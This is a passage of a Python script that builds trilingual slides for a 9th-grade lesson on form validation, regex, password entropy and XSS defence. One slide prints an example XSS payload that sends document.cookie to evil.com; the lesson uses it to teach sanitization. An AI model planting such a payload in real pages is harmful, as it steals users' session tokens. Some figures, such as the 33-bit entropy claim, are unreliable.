#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
scripts/build_9_w12_l34.py — Builder for 9th Grade, Week 12, Lesson 34

Mavzu: Formalar, Regex (Muntazam Ifodalar) va Real-Vaqt Kiber-Validatsiya
Format: Yakka Dars (40 daqiqa), 10 slayd
Kohorta: 9-sinf (Junior Vibecoders, Full-Stack & DevOps Track)
"""

import os
import sys
import json
import re

REPO_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
DEST_DIR = os.path.join(REPO_ROOT, "classes", "9-sinf", "12-hafta", "34-dars-formalar-regex-va-kiber-validatsiya")

os.makedirs(DEST_DIR, exist_ok=True)
os.makedirs(os.path.join(DEST_DIR, "studio"), exist_ok=True)

# -----------------------------------------------------------------------------
# 1. SLIDES HTML (10 Slides for 40-min Single Block)
# -----------------------------------------------------------------------------
SLIDES_HTML = """
  <!-- SLIDE 1: TITUL -->
  <section class="slide current" data-phase="Kirish|Введение|Intro" data-time="00:00–04:00" data-slide-index="0">
    <div class="eyebrow"><span class="t" data-ru="9-КЛАСС · 12-Я НЕДЕЛЯ · УРОК 34" data-en="GRADE 9 · WEEK 12 · LESSON 34">9-SINF · 12-HAFTA · 34-DARS</span></div>
    <h1 class="display" data-ru="Формы, Регулярные Выражения (Regex) и Кибер-Валидация" data-en="Interactive Forms, Regular Expressions (Regex) & Cyber Validation">Formalar, Regex (Muntazam Ifodalar) va Real-Vaqt Kiber-Validatsiya</h1>
    <p class="lede" data-ru="Интерактивная защита ввода данных в SPA: синтаксис Regex-шаблонов, расчет энтропии паролей, API валидации HTML5 и фильтрация XSS/SQL инъекций в реальном времени." data-en="Real-time input validation & cyber hygiene in SPA: Regex pattern syntax, password entropy calculations, HTML5 Constraint Validation APIs, and live XSS/SQLi sanitization.">SPA ilovalarda ma'lumotlar xavfsizligi: Regex qoliplari sintaksisi, parollar entropiyasini hisoblash, HTML5 Constraint Validation API va real-vaqt rejimida XSS/SQLi inyeksiyalaridan tozalash.</p>
    <div class="hero-split">
      <div class="box">
        <div class="tag" data-ru="Формат урока" data-en="Lesson Format">40 daqiqalik Yakka Dars</div>
        <h3 data-ru="Магия Regex" data-en="Regex Power">Regex va Entropiya</h3>
        <p data-ru="Как одной строкой регулярного выражения проверить email, телефон и взломостойкость пароля." data-en="How a single concise regex validates emails, phone patterns, and password strength requirements.">Bitta qisqa Regex qolipi bilan email, telefon va parollarning mustahkamligini xatosiz tekshirish.</p>
      </div>
      <div class="box">
        <div class="tag" data-ru="Ожидаемый результат" data-en="Deliverable">CyberForm Studio</div>
        <h3 data-ru="Живая Валидация" data-en="Live Validation">Real-Vaqt Kiber-Forma</h3>
        <p data-ru="Каждый ученик создаст форму регистрации с мгновенной подсветкой ошибок и санитизацией скриптов." data-en="Each student builds a registration form featuring instant error feedback and script sanitization.">Har bir o'quvchi xatolarni yozayotgan paytda ko'rsatuvchi va XSS xakerlik xurujlarini zararsizlantiruvchi forma yasaydi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 2: MANDATORY HW REVIEW -->
  <section class="slide" data-phase="Uy Vazifasi Tahlili|Разбор ДЗ|Homework Review" data-time="04:00–08:00" data-slide-index="1">
    <div class="eyebrow"><span class="t" data-ru="АНАЛИЗ ДОМАШНЕГО ЗАДАНИЯ 33-УРОКА" data-en="LESSON 33 HOMEWORK REVIEW">33-DARS UY VAZIFASI TAHLILI</span></div>
    <h2 data-ru="SPA и Клиентский Роутинг: Ловушка Ошибки 404 при Перезагрузке (F5)" data-en="SPA Routing: The F5 Page Refresh 404 Trap">SPA Routerning Keng Tarqalgan Xatosi: F5 Bosganda 404 Yiqilishi</h2>
    <div class="grid-2">
      <div class="box danger-border">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="Типичная ошибка (Pitfall)" data-en="Common Pitfall">Keng Tarqalgan Xato (Pitfall)</div>
        <h4 data-ru="Клиентский роутер работает по клику, но падает при F5" data-en="Router functions on click, but crashes upon hard F5 reload">Havola bosilganda ishlaydi, F5 bosganda 404 beradi</h4>
        <p style="font-size:12px;" data-ru="Ученик настроил `history.pushState('/dashboard')`. Нажимая кнопки в меню, SPA переключается идеально. Но когда страницу обновили (F5), сервер вернул '404 Not Found'! Сервер искал реальную папку `/dashboard/index.html`." data-en="Student configured `history.pushState('/dashboard')`. In-app navigation worked fine, but pressing F5 yielded '404 Not Found'! The backend tried serving non-existent directory `/dashboard/index.html`.">O'quvchi menyu tugmalarini bosganda sahifa 0 ms da ochildi. Ammo F5 bosilganda server "404 Not Found" xatosini berdi! Chunki serverda `/dashboard/index.html` degan fayl yo'q edi.</p>
        <pre><code class="language-javascript">// ❌ Xato: Faqat mijozda pushState qilib, server sozlanmagan
history.pushState({}, '', '/dashboard'); // F5 bosilsa 404!</code></pre>
      </div>
      <div class="box" style="border:1px solid var(--green);">
        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Золотой стандарт (Golden Solution)" data-en="Golden Standard">Oltin Standart Yechim</div>
        <h4 data-ru="Server Rewrites (SPA Fallback на index.html)" data-en="Server Rewrites (Fallback all routes to index.html)">Server Rewrites: Barcha yo'llarni index.html ga yo'naltirish</h4>
        <p style="font-size:12px;" data-ru="В Vercel (`vercel.json`) или Nginx настраивается правило перенаправления: любые несуществующие пути отдают корневой `index.html`, а роутер на JS подхватывает `location.pathname`." data-en="Configure Vercel (`vercel.json`) or Nginx rewrite rules: route all path requests to root `index.html` and let the JS router read `location.pathname`.">Vercel yoki Nginx serveriga qoida beriladi: har qanday virtual manzil uchun `index.html` qaytarilsin. Brauzer ichidagi JS router esa o'sha manzilni o'qib kerakli ekranni ochadi.</p>
        <pre><code class="language-json">// ✅ To'g'ri: vercel.json rewrite qoidasi
{ "rewrites": [{ "source": "/(.*)", "destination": "/index.html" }] }</code></pre>
      </div>
    </div>
    <div class="grid-2" style="margin-top:10px;">
      <div class="box">
        <div class="tag" data-ru="30-секундный Блиц" data-en="30-Sec Blitz">30 Soniyalik Blitz</div>
        <p style="font-size:11px;" data-ru="Какое событие браузера срабатывает, когда пользователь нажимает кнопку «Назад» в браузере?" data-en="Which browser event fires when the user clicks the browser Back button?">Foydalanuvchi brauzerning "Orqaga" tugmasini bosganda qaysi JavaScript hodisasi ishga tushadi?</p>
        <div style="font-size:11px; color:var(--accent); font-weight:700;" data-ru="Ответ: window.onpopstate (или window.addEventListener('popstate'))." data-en="Answer: window.onpopstate event.">Javob: window.addEventListener('popstate') hodisasi!</div>
      </div>
      <div class="box">
        <div class="tag" data-ru="Мост к теме 34" data-en="Bridge to Lesson 34">Bugungi Mavzuga Ko'prik</div>
        <p style="font-size:11px;" data-ru="SPA работает без перезагрузки. Но что происходит, когда пользователь отправляет форму? Стандартный submit перезагрузит страницу! Нам нужна интерактивная валидация." data-en="Our SPA runs smoothly. But traditional forms reload the whole page on submit! We need real-time event-driven validation.">SPA sahifani qayta yuklamaydi. Ammo oddiy forma yuborilsa, sahifa yana qayta yuklanadi! Bizga `preventDefault()` va real-vaqt kiber-validatsiyasi kerak.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 3: WHY CLASSIC FORMS SUCK -->
  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="08:00–14:00" data-slide-index="2">
    <div class="eyebrow"><span class="t" data-ru="ЭВОЛЮЦИЯ ИНТЕРФЕЙСОВ" data-en="UI EVOLUTION">INTERFEYSLAR EVOLYUTSIYASI</span></div>
    <h2 data-ru="Почему Классические POST-Формы Умерли?" data-en="Why Traditional POST Forms Are Dead">Nega Klassik POST-Formalar Davri Tugadi?</h2>
    <div class="grid-2">
      <div class="box danger-border">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="1. Старый Web 1.0 (POST Refresh)" data-en="Old Web 1.0 (POST Refresh)">Klassik Web 1.0 (POST Qayta Yuklash)</div>
        <p style="font-size:12px; line-height:1.6;" data-ru="1. Пользователь заполняет 10 полей.<br>2. Нажимает «Отправить». Экран мигает белым.<br>3. Сервер через 2 секунды возвращает ошибку «Неверный email».<br>4. Все остальные введенные поля стерлись! Пользователь в ярости." data-en="1. User fills 10 inputs.<br>2. Clicks 'Submit'. Screen flickers white.<br>3. Server responds after 2s: 'Invalid email'.<br>4. All inputs reset to empty! User rage quits.">1. Foydalanuvchi 10 ta maydonni to'ldiradi.<br>2. "Yuborish"ni bosadi. Ekran oq bo'lib qotadi.<br>3. Server 2 soniyadan so'ng: "Email xato" deb qaytaradi.<br>4. Barcha to'ldirilgan maydonlar o'chib ketadi! Foydalanuvchi saytdan chiqib ketadi.</p>
      </div>
      <div class="box" style="border:1px solid var(--green);">
        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="2. Современный SPA (0 ms Реакция)" data-en="Modern SPA (0 ms Real-Time)">Zamonaviy SPA (0 ms Real-Vaqt Reaksiyasi)</div>
        <p style="font-size:12px; line-height:1.6;" data-ru="1. Пользователь печатает: `e.preventDefault()`.<br>2. Событие <code>input</code> на лету проверяет каждый символ.<br>3. Мгновенная зеленая галочка или понятная подсказка.<br>4. Никаких перезагрузок, данные сохраняются в памяти." data-en="1. Intercept submit via `e.preventDefault()`.<br>2. The <code>input</code> event validates keystrokes in 0 ms.<br>3. Instant dynamic badge: green checkmark or helpful hint.<br>4. Zero reloads, form data preserved in client state.">1. Forma yuborilishi `e.preventDefault()` bilan tutib qolinadi.<br>2. <code>input</code> hodisasi har bir harf kiritilganda 0 ms da tekshiradi.<br>3. Yashil belgi yoki aniq yo'riqnoma darhol chiqadi.<br>4. Sahifa hech qachon qayta yuklanmaydi, ma'lumotlar saqlanadi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 4: REGEX SYNTAX -->
  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="14:00–20:00" data-slide-index="3">
    <div class="eyebrow"><span class="t" data-ru="СИНТАКСИС ШАБЛОНОВ" data-en="PATTERN SYNTAX">MUNTIZAM IFODALAR (REGEX)</span></div>
    <h2 data-ru="Анатомия Регулярных Выражений (Regex) в JavaScript" data-en="JavaScript Regular Expressions (Regex) Anatomy">JavaScript-da Regex (Muntazam Ifodalar) Anatomiyasi</h2>
    <div class="grid-2">
      <div class="box">
        <div class="tag" data-ru="Ключевые Метасимволы" data-en="Key Metacharacters">Asosiy Meta-Belgilar</div>
        <ul style="font-size:12px; line-height:1.7; margin-top:6px;">
          <li><code>^</code> va <code>$</code> — <span class="t" data-ru="Начало и конец строки (строгое соответствие)" data-en="Start and end of string (strict boundary)">Satrning boshi va oxiri (qat'iy chegara)</span></li>
          <li><code>\\d</code> — <span class="t" data-ru="Любая цифра [0-9]" data-en="Any digit [0-9]">Ixtiyoriy raqam [0-9]</span></li>
          <li><code>\\w</code> — <span class="t" data-ru="Буква, цифра или подчёркивание [a-zA-Z0-9_]" data-en="Word character [a-zA-Z0-9_]">Harf, son yoki pastki chiziqcha</span></li>
          <li><code>+</code> — <span class="t" data-ru="1 или более повторений" data-en="1 or more occurrences">1 yoki undan ko'p marta uchrash</span></li>
          <li><code>*</code> — <span class="t" data-ru="0 или более повторений" data-en="0 or more occurrences">0 yoki undan ko'p marta uchrash</span></li>
          <li><code>{8,}</code> — <span class="t" data-ru="Минимум 8 символов" data-en="Minimum 8 characters">Kamida 8 ta belgi bo'lishi</span></li>
          <li><code>[A-Z]</code> — <span class="t" data-ru="Хотя бы одна заглавная буква" data-en="At least one uppercase character">Katta harf oraliqlari</span></li>
        </ul>
      </div>
      <div class="box">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Методы Regex в JS" data-en="Regex Methods in JS">JS-da Regex Metodlari</div>
        <pre><code class="language-javascript">// 1. Qat'iy tekshirish (true/false)
const emailRegex = /^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/;
console.log(emailRegex.test("user@target.uz")); // true

// 2. Mos keluvchini qidirish
const phoneRegex = /\+998\d{9}/;
const match = "+998901234567".match(phoneRegex);

// 3. Tozalash va almashtirish (Sanitize)
const clean = dirtyStr.replace(/<[^>]*>/g, "");</code></pre>
      </div>
    </div>
  </section>

  <!-- SLIDE 5: EMAIL, PHONE & PASSWORD PATTERNS -->
  <section class="slide" data-phase="Nazariya|Теория|Theory" data-time="20:00–25:00" data-slide-index="4">
    <div class="eyebrow"><span class="t" data-ru="БОЕВЫЕ ШАБЛОНЫ" data-en="PRODUCTION PATTERNS">AMALIY ISHCHI QOLIPLAR</span></div>
    <h2 data-ru="3 Главных Шаблона: Email, Телефон Узбекистана и Пароль" data-en="3 Production Regexes: Email, UZ Phone & Strong Passwords">3 Asosiy Amaliy Qolip: Email, O'zbekiston Telefoni va Parol</h2>
    <div class="grid-3">
      <div class="box">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);">1. Email Qolipi</div>
        <pre><code class="language-javascript">/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/</code></pre>
        <p style="font-size:11px; color:var(--ink-2);" data-ru="Проверяет наличие имени, символа @, домена и зоны не менее 2 букв (.uz, .com)." data-en="Enforces username characters, single @, valid domain, and TLD of at least 2 chars (.uz, .com).">Foydalanuvchi nomi, bitta @ belgisi, domen va kamida 2 harfli TLD (.uz, .com) mavjudligini kafolatlaydi.</p>
      </div>
      <div class="box">
        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);">2. Telefon (+998)</div>
        <pre><code class="language-javascript">/^\+998(9[0-9]|33|88)\d{7}$/</code></pre>
        <p style="font-size:11px; color:var(--ink-2);" data-ru="Только корректные префиксы операторов Узбекистана (90, 91, 93, 94, 97, 99, 33, 88) и ровно 7 цифр." data-en="Matches only valid Uzbek operator prefixes (90, 91, 99, 33, 88) followed by exactly 7 digits.">Faqat O'zbekiston aloqa operatorlari kodlari (90, 91, 99, 33, 88) va undan keyin roppa-rosa 7 ta raqam.</p>
      </div>
      <div class="box">
        <div class="tag" style="background:rgba(168,85,247,0.15); color:var(--purple);">3. Kuchli Parol</div>
        <pre><code class="language-javascript">/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*]).{8,}$/</code></pre>
        <p style="font-size:11px; color:var(--ink-2);" data-ru="Lookahead проверки: минимум 8 символов, заглавная, строчная буква, цифра и спецсимвол." data-en="Lookahead asserts: 8+ chars, lowercase, uppercase, digit, and special cyber character.">Positive lookahead: kamida 8 ta belgi, bitta katta harf, bitta kichik harf, bitta raqam va maxsus belgi.</p>
      </div>
    </div>
  </section>

  <!-- SLIDE 6: PASSWORD ENTROPY -->
  <section class="slide" data-phase="Kiberxavfsizlik|Кибербезопасность|Security" data-time="25:00–29:00" data-slide-index="5">
    <div class="eyebrow"><span class="t" data-ru="МАТЕМАТИКА БЕЗОПАСНОСТИ" data-en="SECURITY MATH">KIBER-MATEMATIKA</span></div>
    <h2 data-ru="Энтропия Пароля: Сколько Бит Нужно Против Brute-Force?" data-en="Password Entropy: How Many Bits Resist Brute-Force?">Parol Entropiyasi: Brute-Force Hujumiga Qancha Bit Kerak?</h2>
    <div class="grid-2">
      <div class="box">
        <div class="tag" data-ru="Формула Шеннона" data-en="Shannon Formula">Entropiya Formulasi</div>
        <div style="font-size:16px; font-family:monospace; color:var(--accent); margin:10px 0; font-weight:700;">E = L × log₂(R)</div>
        <ul style="font-size:12px; line-height:1.7;">
          <li><strong>L:</strong> <span class="t" data-ru="Длина пароля (количество символов)" data-en="Password length (character count)">Parol uzunligi (belgilar soni)</span></li>
          <li><strong>R:</strong> <span class="t" data-ru="Пул символов (10 цифр, 26 букв, 32 спецсимвола = 94)" data-en="Character pool size (digits 10, letters 26+26, symbols 32 = 94)">Belgilar to'plami (raqamlar 10, harflar 52, belgilar 32 = 94)</span></li>
          <li><strong>E &lt; 40 bit:</strong> <span style="color:var(--red);" data-ru="Слабый пароль, взламывается за минуты" data-en="Weak password, cracked in minutes">Juda zaif, bir necha daqiqada buziladi</span></li>
          <li><strong>E &gt; 60 bit:</strong> <span style="color:var(--green); font-weight:700;" data-ru="Надежный kiber-parol (миллионы лет перебора)" data-en="Resilient password (millions of years to crack)">Kiber-mustahkam (millionlab yillar kerak)</span></li>
        </ul>
      </div>
      <div class="box" style="border:1px solid var(--accent);">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Таблица Стойкости" data-en="Crack Time Comparison">Buzilish Vaqtlari Taqqoslash</div>
        <table style="width:100%; border-collapse:collapse; font-size:11px; margin-top:8px;">
          <tr style="border-bottom:1px solid var(--hair);">
            <th style="padding:4px;" data-ru="Пароль" data-en="Password">Parol</th>
            <th style="padding:4px;" data-ru="Длина / Пул" data-en="Length / Pool">Uzunlik / Pool</th>
            <th style="padding:4px;" data-ru="Энтропия" data-en="Entropy">Entropiya</th>
            <th style="padding:4px;" data-ru="Время Взлома (RTX 4090)" data-en="Crack Time (RTX 4090)">Buzilish Vaqti</th>
          </tr>
          <tr style="border-bottom:1px dashed var(--hair); color:var(--red);">
            <td style="padding:4px;" data-ru="target2026" data-en="target2026">target2026</td>
            <td style="padding:4px;" data-ru="10 символов (буква+цифра)" data-en="10 chars (alphanumeric)">10 belgi (harf+son)</td>
            <td style="padding:4px;" data-ru="33 бита" data-en="33 bits">33 bit</td>
            <td style="padding:4px;" data-ru="0.02 секунды" data-en="0.02 seconds">0.02 soniya</td>
          </tr>
          <tr style="border-bottom:1px dashed var(--hair); color:var(--yellow);">
            <td style="padding:4px;" data-ru="Target#2026" data-en="Target#2026">Target#2026</td>
            <td style="padding:4px;" data-ru="11 символов (+заглавная+символ)" data-en="11 chars (+upper+symbol)">11 belgi (+katta+simvol)</td>
            <td style="padding:4px;" data-ru="48 бит" data-en="48 bits">48 bit</td>
            <td style="padding:4px;" data-ru="3 дня" data-en="3 days">3 kun</td>
          </tr>
          <tr style="color:var(--green); font-weight:700;">
            <td style="padding:4px;" data-ru="K!ber#T@rget$2026" data-en="K!ber#T@rget$2026">K!ber#T@rget$2026</td>
            <td style="padding:4px;" data-ru="17 символов (полный пул)" data-en="17 chars (full pool)">17 belgi (to'liq pool)</td>
            <td style="padding:4px;" data-ru="82 бита" data-en="82 bits">82 bit</td>
            <td style="padding:4px;" data-ru="400 миллионов лет!" data-en="400 million years!">400 million yil!</td>
          </tr>
        </table>
      </div>
    </div>
  </section>

  <!-- SLIDE 7: XSS SANITIZATION -->
  <section class="slide" data-phase="Kiberxavfsizlik|Кибербезопасность|Security" data-time="29:00–33:00" data-slide-index="6">
    <div class="eyebrow"><span class="t" data-ru="ЗАЩИТА ОТ ИНЪЕКЦИЙ" data-en="INJECTION DEFENSE">XSS VA KIBER-HIMOYA</span></div>
    <h2 data-ru="Санитизация Данных: Защита от XSS (Cross-Site Scripting)" data-en="Data Sanitization: Defending Against XSS Attacks">Ma'lumotlarni Tozalash: XSS Hujumlarini Bartaraf Qilish</h2>
    <div class="grid-2">
      <div class="box danger-border">
        <div class="tag" style="background:rgba(239,68,68,0.15); color:var(--red);" data-ru="Хакерский Ввод (Stored XSS)" data-en="Hacker Payload (Stored XSS)">Xakerlik Kiritmasi (XSS Payload)</div>
        <p style="font-size:12px;" data-ru="Злоумышленник в поле «Имя» вводит вредоносный JavaScript-код:" data-en="Attacker enters malicious JavaScript code into the user name field:">Hujumchi "Ism" maydoniga quyidagi yovuz kodni kiritadi:</p>
        <pre><code class="language-html">&lt;script&gt;fetch('https://evil.com/steal?cookie='+document.cookie)&lt;/script&gt;
&lt;img src="x" onerror="alert('Buzildi!')" /&gt;</code></pre>
        <p style="font-size:11px; color:var(--red);" data-ru="Если вставить это через `innerHTML`, браузер выполнит скрипт и украдет JWT-токены пользователей!" data-en="Injecting this via `innerHTML` executes the script immediately, stealing session tokens!">Agar bu matn `innerHTML` orqali ekranga chiqarilsa, brauzer darhol skriptni bajaradi va foydalanuvchining barcha tokenlarini o'g'irlaydi!</p>
      </div>
      <div class="box" style="border:1px solid var(--green);">
        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Золотой Стандарт Санитизации" data-en="Sanitization Standard">Oltin Standart: Tozalash Moduli</div>
        <p style="font-size:12px;" data-ru="1. Никогда не используйте `innerHTML` для пользовательского ввода, только `textContent`!<br>2. Экранируйте опасные символы перед сохранением:" data-en="1. Never render user inputs via `innerHTML`, use `textContent`!<br>2. Escape dangerous HTML entities prior to saving:">1. Foydalanuvchi kiritmasini hech qachon `innerHTML` bilan ko'rsatmang, faqat `textContent`!<br>2. Xavfli belgilarni maxsus HTML obyektlariga almashtiring:</p>
        <pre><code class="language-javascript">function sanitizeHTML(str) {
  const map = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#x27;', '/': '&#x2F;'
  };
  return str.replace(/[&<>"'/]/g, s => map[s]);
}</code></pre>
      </div>
    </div>
  </section>

  <!-- SLIDE 8: SMARTBOARD INTERACTIVE DEMO -->
  <section class="slide" data-phase="Jonli Sinov|Живой Тест|Live Test" data-time="33:00–37:00" data-slide-index="7">
    <div class="eyebrow"><span class="t" data-ru="ИНТЕРАКТИВНЫЙ ТРЕНАЖЕР" data-en="INTERACTIVE SIMULATOR">SMARTBOARD BOSHQARUVI</span></div>
    <h2 data-ru="Живой Тестер Валидации: Проверь Пароль и Email" data-en="Live Validation Tester: Test Passwords & Emails">Jonli Validatsiya Sinovi: Email va Parolni Sinab Ko'ring</h2>
    <div style="background:var(--surface); border:1px solid var(--hair); border-radius:8px; padding:12px; margin-top:8px;">
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px;">
        <div>
          <label style="font-size:11px; font-weight:700; color:var(--accent);" data-ru="Email Адрес:" data-en="Email Address:">Email Manzili:</label>
          <input id="demoEmail" type="text" placeholder="user@target.uz" data-placeholder-ru="user@target.uz" data-placeholder-en="user@target.uz" oninput="testDemoEmail()" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #334155; color:#fff; padding:6px 10px; border-radius:4px; font-size:12px; margin-top:4px;" />
          <div id="demoEmailStatus" style="font-size:11px; margin-top:4px; font-weight:700; color:#64748b;" data-ru="Введите email..." data-en="Enter email...">Email kiriting...</div>

          <label style="font-size:11px; font-weight:700; color:var(--purple); margin-top:10px; display:block;" data-ru="Пароль (Проверка Энтропии):" data-en="Password (Entropy Test):">Parol (Entropiya Sinovi):</label>
          <input id="demoPass" type="text" placeholder="Kiber#Parol2026" data-placeholder-ru="Kiber#Parol2026" data-placeholder-en="Kiber#Parol2026" oninput="testDemoPassword()" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #334155; color:#fff; padding:6px 10px; border-radius:4px; font-size:12px; margin-top:4px;" />
          <div style="width:100%; height:6px; background:#1e293b; border-radius:3px; margin-top:6px; overflow:hidden;">
            <div id="demoEntropyBar" style="width:0%; height:100%; background:#ef4444; transition:width 0.2s, background 0.2s;"></div>
          </div>
          <div id="demoPassStatus" style="font-size:11px; margin-top:4px; font-weight:700; color:#64748b;" data-ru="Энтропия: 0 бит" data-en="Entropy: 0 bits">Entropiya: 0 bit</div>
        </div>

        <div style="background:#090d16; border:1px solid #1e293b; border-radius:6px; padding:10px; font-family:monospace; font-size:11px;">
          <div style="color:var(--accent); font-weight:700; margin-bottom:6px;" data-ru="🛡️ XSS Санитизатор (Live Output):" data-en="🛡️ XSS Sanitizer (Live Output):">🛡️ XSS Sanitize Natijasi:</div>
          <div style="color:#64748b; font-size:10px;" data-ru="Введите вредоносный &lt;script&gt; в поле пароля:" data-en="Type a malicious &lt;script&gt; into the password field:">Parol maydoniga yovuz &lt;script&gt; yozib ko‘ring:</div>
          <div id="demoSanitizedOutput" style="background:#111827; padding:8px; border-radius:4px; margin-top:6px; color:#10b981; word-break:break-all; min-height:60px;">Tozalangan matn shu yerda chiqadi...</div>
        </div>
      </div>
    </div>
  </section>

  <!-- SLIDE 9: QUICK QUIZ -->
  <section class="slide" data-phase="Viktorina|Викторина|Quiz" data-time="37:00–39:00" data-slide-index="8">
    <div class="eyebrow"><span class="t" data-ru="ЭКСПРЕСС-ТЕСТ" data-en="RAPID QUIZ">TEZKOR TEST</span></div>
    <h2 data-ru="3 Вопроса по Regex и Безопасности Форм" data-en="3 Questions on Regex & Form Cyber Hygiene">Regex va Forma Xavfsizligi Bo'yicha 3 Savol</h2>
    <div class="grid-3">
      <div class="box">
        <div class="tag">Savol 1</div>
        <h4 data-ru="Какое событие лучше всего подходит для мгновенной валидации?" data-en="Which event is best suited for real-time validation?">Real-vaqtda validatsiya uchun qaysi hodisa eng mos keladi?</h4>
        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
          <div>A) <code>click</code></div>
          <div style="color:var(--green); font-weight:700;">B) <code>input</code> (har bir harfda)</div>
          <div>C) <code>unload</code></div>
        </div>
      </div>
      <div class="box">
        <div class="tag">Savol 2</div>
        <h4 data-ru="Что означает квантификатор {8,} в регулярном выражении?" data-en="What does the quantifier {8,} assert in regex?">Regex qolipidagi <code>{8,}</code> nimani bildiradi?</h4>
        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
          <div>A) Roppa-rosa 8 ta belgi</div>
          <div style="color:var(--green); font-weight:700;">B) Kamida 8 ta yoki undan ko'p belgi</div>
          <div>C) 8 ta bo'sh joy</div>
        </div>
      </div>
      <div class="box">
        <div class="tag">Savol 3</div>
        <h4 data-ru="Как безопаснее всего отображать пользовательский текст?" data-en="How to safely render untrusted user text in DOM?">DOM-da matnni XSS-dan xoli xavfsiz ko'rsatish yo'li qaysi?</h4>
        <div style="font-size:11px; margin-top:6px; line-height:1.5;">
          <div>A) <code>element.innerHTML</code></div>
          <div style="color:var(--green); font-weight:700;">B) <code>element.textContent</code></div>
          <div>C) <code>document.write()</code></div>
        </div>
      </div>
    </div>
  </section>

  <!-- SLIDE 10: SUMMARY & HOMEWORK -->
  <section class="slide" data-phase="Xulosa|Итоги|Summary" data-time="39:00–40:00" data-slide-index="9">
    <div class="eyebrow"><span class="t" data-ru="ИТОГИ И ДОМАШНЕЕ ЗАДАНИЕ" data-en="SUMMARY & HOMEWORK">XULOSA VA UY VAZIFASI</span></div>
    <h2 data-ru="Итоги 34-Урока и Домашний Проект" data-en="Lesson 34 Takeaways & Homework Assignment">34-Dars Xulosalari va Kiber-Forma Loyihasi</h2>
    <div class="grid-2">
      <div class="box">
        <div class="tag" style="background:rgba(59,130,246,0.15); color:var(--accent);" data-ru="Домашнее Задание" data-en="Homework Assignment">Uy Vazifasi (vazifa.html)</div>
        <p style="font-size:12px; line-height:1.6;" data-ru="<strong>1-Уровень (4 б):</strong> Написать Regex для проверки почты и телефона Узбекистана.<br><strong>2-Уровень (4 б):</strong> Создать живую форму с подсчетом энтропии пароля на событии <code>input</code>.<br><strong>3-Уровень (2 б):</strong> Внедрить функцию <code>sanitizeHTML()</code>, нейтрализующую теги &lt;script&gt;." data-en="<strong>Tier 1 (4 pts):</strong> Formulate Regex patterns for email and Uzbek mobile phone.<br><strong>Tier 2 (4 pts):</strong> Implement a live form computing password entropy via <code>input</code> listeners.<br><strong>Tier 3 (2 pts):</strong> Code a <code>sanitizeHTML()</code> entity escaping module neutralizing &lt;script&gt; tags."><strong>1-Daraja (4 b):</strong> Email va O'zbekiston telefoni uchun Regex qoliplarini yozish.<br><strong>2-Daraja (4 b):</strong> <code>input</code> hodisasida parol entropiyasini hisoblovchi jonli forma yaratish.<br><strong>3-Daraja (2 b):</strong> &lt;script&gt; teglarini zararsizlantiruvchi <code>sanitizeHTML()</code> funksiyasini yozish.</p>
      </div>
      <div class="box" style="border:1px solid var(--accent);">
        <div class="tag" style="background:rgba(16,185,129,0.15); color:var(--green);" data-ru="Анонс 35-Урока" data-en="Next Lesson 35">Keyingi Dars (35-Dars)</div>
        <h4 data-ru="Экосистема NPM и Безопасность Сторонних Пакетов" data-en="NPM Ecosystem & Supply Chain Security">NPM Ekotizimi va Tashqi Paketlar Xavfsizligi</h4>
        <p style="font-size:12px;" data-ru="В следующий раз мы разберем пакетный менеджер Node.js, семантическое версионирование, команду <code>npm audit</code> и защиту от вредоносных библиотек (Supply Chain Attacks)!" data-en="Next time we dive into the Node.js package manager, semantic versioning (^, ~), <code>npm audit</code>, and defense against poisoned open-source libraries (Supply Chain Attacks)!">Keyingi darsimizda Node.js paketlar menejeri, semantik versiyalash (^, ~), <code>npm audit</code> va zaharli ochiq-kodli kutubxonalardan himoyalanishni o'rganamiz!</p>
      </div>
    </div>
  </section>
"""

# -----------------------------------------------------------------------------
# 2. NOTES DATA (10 Slides Notes for 40-min Single Block)
# -----------------------------------------------------------------------------
NOTES_DATA = {
    "uz": [
        ["Kirish va Maqsad", "O'quvchilarga bugungi mavzu: Formalar, Regex va real-vaqt kiber-validatsiyasi ekanini e'lon qiling.", "Doskaga POST reload vs SPA 0ms taqqoslashini chizing."],
        ["Uy Vazifasi Tahlili", "33-darsdagi SPA routerda F5 bosilganda 404 xatosi chiqishi (Vercel rewrite yo'qligi) sababini tushuntiring.", "Oltin yechim: barcha yo'llarni index.html ga yo'naltirish ekanini ayting."],
        ["Klassik Formalar Muammosi", "Nega sahifani qayta yuklash foydalanuvchini charchatishini tushuntiring.", "e.preventDefault() va input hodisasi afzalligini ko'rsating."],
        ["Regex Sintaksisi", "Muntazam ifodalarning asosiy meta-belgilarini doskaga yozing (^, $, \\d, \\w, +, {8,}).", "O'quvchilar bilan test() metodini ko'rib chiqing."],
        ["Amaliy Qoliplar", "Email, +998 telefon va parol qoliplarini slayd orqali tahlil qiling.", "O'quvchilarga O'zbekiston operatorlari prefikslarini eslatib o'ting."],
